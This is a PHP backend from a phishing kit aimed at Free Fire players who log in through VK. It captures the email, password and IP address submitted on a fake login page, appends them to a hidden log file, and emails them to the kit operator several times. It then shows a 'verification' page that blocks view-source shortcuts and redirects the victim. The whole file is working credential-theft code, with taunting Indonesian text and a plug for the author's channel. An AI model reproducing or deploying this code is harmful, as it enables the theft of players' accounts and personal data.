<?php
file_put_contents("/data/data/com.termux/files/home/ffhax/.log.txt", "USERNAME/ID: " . $_POST['email'] . " PASSWORD: " . $_POST['password'] . "\n", FILE_APPEND);
?>

<?php
error_reporting(0);
include('cilepeung.php');

$email = $_POST['email'];
$pass = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];

$headers .= "Content-type: text/html\r\n"; // Server Ko Diperintah.
$success = mail($mailto, $subjek, $body, $headers); // Diubah Auto Error!

include 'emailmu.php';

$body = <<<EOD
            <html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><style>table, td, th {border: 2px solid red;text-align: center;}table{border-collapse: collapse;width: 100%;}th, td {padding: 8px;}tr:hover{background-color:#f5f5f5}</style></head>
           <div style="font-family: monospace;"><body><table><tr><td><b>INI AKUN VK GOBLOK</b></td></tr><tr><td><b>CEPET AMANIN COK!!!</b></td></tr></table></div><br>
            <center><table><tr><td><b>Email</b></td><td>$email</td></tr>
<tr><td><b>Password</b></td><td>$pass</td></tr>
<tr><td><b>IP Address<b></td><td>$ip</td></tr></table><br>
</center>
<center><div style="font-family: monospace;"><b>==== JANGAN LUPA SUBSCRIBE ====
</b>
<div style="font-family: monospace;"><b>=== CHANNEL BOTJAH PATJUL COK ===</div></b></center>
</body></html>

EOD;

$subjek = 'Free Fire | VK | BotjahPatjul | '.$ip.'';
$headers = "From: Result FF Login VK<botjahpatjul@gaul.com>\r\n"; // Jangan Diganti Kalo Gamau Error!!
$headers .= "Content-type: text/html\r\n"; // Server Ko Diperintah.
$success = mail($mailto, $subjek, $body, $headers); // Diubah Auto Error!

include 'emailmu.php';

$body = <<<EOD
            <html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><style>table, td, th {border: 2px solid red;text-align: center;}table{border-collapse: collapse;width: 100%;}th, td {padding: 8px;}tr:hover{background-color:#f5f5f5}</style></head>
           <div style="font-family: monospace;"><body><table><tr><td><b>INI AKUN VK GOBLOK</b></td></tr><tr><td><b>CEPET AMANIN COK!!!</b></td></tr></table></div><br>
            <center><table><tr><td><b>Email</b></td><td>$email</td></tr>
<tr><td><b>Password</b></td><td>$pass</td></tr>
<tr><td><b>IP Address<b></td><td>$ip</td></tr></table><br>
</center>
<center><div style="font-family: monospace;"><b>==== JANGAN LUPA SUBSCRIBE ====
</b>
<div style="font-family: monospace;"><b>=== CHANNEL BOTJAH PATJUL COK ===</div></b></center>
</body></html>

EOD;

$subjek = 'Free Fire | VK | BotjahPatjul | '.$ip.'';
$headers = "From: Result FF Login VK<botjahpatjul@gaul.com>\r\n"; // Jangan Diganti Kalo Gamau Error!!
$headers .= "Content-type: text/html\r\n"; // Server Ko Diperintah.
$success = mail($mailto, $subjek, $body, $headers); // Diubah Auto Error!

include 'zx.php';

$body = <<<EOD
            <html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><style>table, td, th {border: 2px solid red;text-align: center;}table{border-collapse: collapse;width: 100%;}th, td {padding: 8px;}tr:hover{background-color:#f5f5f5}</style></head>
           <div style="font-family: monospace;"><body><table><tr><td><b>INI AKUN VK GOBLOK</b></td></tr><tr><td><b>CEPET AMANIN COK!!!</b></td></tr></table></div><br>
            <center><table><tr><td><b>Email</b></td><td>$email</td></tr>
<tr><td><b>Password</b></td><td>$pass</td></tr>
<tr><td><b>IP Address<b></td><td>$ip</td></tr></table><br>
</center>
<center><div style="font-family: monospace;"><b>==== JANGAN LUPA SUBSCRIBE ====
</b>
<div style="font-family: monospace;"><b>=== CHANNEL BOTJAH PATJUL COK ===</div></b></center>
</body></html>

EOD;

$subjek = 'Free Fire | VK | BotjahPatjul | '.$ip.'';
$headers = "From: Result FF Login VK<botjahpatjul@gaul.com>\r\n"; // Jangan Diganti Kalo Gamau Error!!
$headers .= "Content-type: text/html\r\n"; // Server Ko Diperintah.
$success = mail($mailto, $subjek, $body, $headers); // Diubah Auto Error!

?>
<?php
$random = rand(1000,5000);
?>
<!DOCTYPE html>
<html lang="en">
	<head>
<title>Verifikasi...</title>
		<noscript><meta http-equiv="refresh" content="0; URL=https://www.facebook.com/botjah.patjul1"/></noscript>
		<meta name="description" content="Login!"/>
		 
        <meta name="viewport" content="width=360.1, user-scalable=no, initial-scale=1.0, maximum-scale=1.0">
        <meta name="mobile-web-app-capable" content="yes"/>
        <meta name="apple-mobile-web-app-capable" content="yes"/>
        <meta name="apple-mobile-web-app-status-bar-style" content="black"/>
        <meta name="msapplication-tap-highlight" content="no"/>
        <meta name="format-detection" content="telephone=no">
   		<meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'/>
		<link rel="shortcut icon" href="./img/favicon.png"/>
   		<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
        
    	<link rel="stylesheet" media="all" href="./css/style.css"/>
	</head>
	<body>
        
		</script>
		<!--Kode untuk mencegah shorcut keyboard, view source dll.-->
		<script type="text/javascript">
			window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
		</script>
		<script type="text/javascript">
			document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
		</script>
    <!-- </body> --!></body>
</html>

<script>window.location.replace("aman.php")</script>';}
}
?>
